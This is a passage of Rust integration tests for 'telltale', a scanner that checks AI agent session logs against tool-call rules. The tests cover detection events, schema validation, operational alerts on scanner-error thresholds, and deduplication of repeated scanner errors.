        ),
    )
    .expect("mock env");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--rules"])
        .arg(&rule_path)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_RISK_THRESHOLD_HIGH", "1")
        .current_dir(temp.path())
        .output()
        .expect("run telltale scan");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(matches!(
        listener.accept(),
        Err(error) if error.kind() == std::io::ErrorKind::WouldBlock
    ));

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 1);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let detection = events
        .iter()
        .find(|event| event["event_type"] == "detection")
        .expect("detection event");
    assert!(detection.get("triage").is_none());
    assert!(
        !detection["timeline_anchors"]
            .as_array()
            .expect("timeline anchors")
            .is_empty()
    );
    assert!(detection["response"].is_object());
}

#[test]
fn scan_once_uses_canonical_threshold_without_network() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions/2026/04");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("uc001-positive.jsonl"),
        include_str!(
            "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
        ),
    )
    .expect("uc001 fixture");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let rule_path = std::env::current_dir()
        .expect("repo cwd")
        .join("config/rules/tool-call-regex.yaml");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--rules"])
        .arg(&rule_path)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_RISK_THRESHOLD_HIGH", "1")
        .env_remove("LITELLM_API_BASE")
        .env_remove("LITELLM_API_KEY")
        .env_remove("MODEL")
        .env_remove("LLAMA_GUARD_MODEL")
        .current_dir(temp.path())
        .output()
        .expect("run telltale scan");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let lines = fs::read_to_string(log_path).expect("log file");
    let detection = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .find(|event| event["event_type"] == "detection")
        .expect("detection event");
    assert!(detection.get("triage").is_none());
    assert!(detection["response"].is_object());

    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    assert!(
        validator.is_valid(&detection),
        "native detection event failed schema validation"
    );
}

#[test]
fn operational_alert_emitted_when_scanner_errors_exceed_threshold() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    // Use a malformed source that triggers a scanner_error event.
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_OP_ALERT_MAX_SCANNER_ERRORS", "0")
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    let events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    let alert = events
        .iter()
        .find(|event| event["event_type"] == "operational_alert")
        .expect("operational_alert event should be present");
    assert_eq!(alert["severity"], "warning");
    assert_eq!(alert["client"], "scanner");
    assert_eq!(alert["session_id"], "scanner");
    assert!(
        alert["categories"]
            .as_array()
            .unwrap()
            .contains(&Value::String("operational".to_string()))
    );
    assert!(
        alert["tags"]
            .as_array()
            .unwrap()
            .contains(&Value::String("operational".to_string()))
    );
    assert!(
        alert["tags"]
            .as_array()
            .unwrap()
            .contains(&Value::String("scanner_health".to_string()))
    );
    assert_eq!(alert["risk_score"], 0);
    assert_eq!(alert["telltale_version"], env!("CARGO_PKG_VERSION"));

    // Verify the alert_type evidence field.
    let alert_type_evidence = alert["evidence"]
        .as_array()
        .unwrap()
        .iter()
        .find(|e| e["field"] == "alert_type")
        .expect("alert_type evidence");
    assert_eq!(
        alert_type_evidence["redacted_value"],
        "scanner_error_threshold_exceeded"
    );

    // Validate against the event schema.
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    assert!(
        validator.is_valid(alert),
        "operational_alert event failed schema validation"
    );
}

#[test]
fn operational_alert_not_emitted_when_scanner_errors_below_threshold() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_OP_ALERT_MAX_SCANNER_ERRORS", "5")
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    let events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    assert!(
        !events
            .iter()
            .any(|event| event["event_type"] == "operational_alert"),
        "operational_alert should not be emitted when errors are below threshold"
    );
}

#[test]
fn scanner_error_events_dedup_on_subsequent_scans() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let run_scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args(["--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .env("TELLTALE_OP_ALERT_MAX_SCANNER_ERRORS", "5")
            .output()
            .expect("run telltale");

        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    };

    run_scan();

    let lines = fs::read_to_string(&log_path).expect("log file after first scan");
    let first_events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "scanner_error"),
        "first scan should emit a scanner_error event"
    );
    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "health"),
        "first scan should emit health for the new scanner error"
    );

    run_scan();

    let lines = fs::read_to_string(&log_path).expect("log file after second scan");
    let all_events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    let scanner_errors: Vec<_> = all_events
        .iter()
        .filter(|event| event["event_type"] == "scanner_error")
        .collect();
    assert_eq!(
        scanner_errors.len(),
        1,
        "second scan should suppress an unchanged scanner_error"
    );

    let health_events: Vec<_> = all_events
        .iter()
        .filter(|event| event["event_type"] == "health")
        .collect();
    assert_eq!(
        health_events.len(),
        1,
        "second scan should not emit health for an unchanged scanner_error"
    );
}
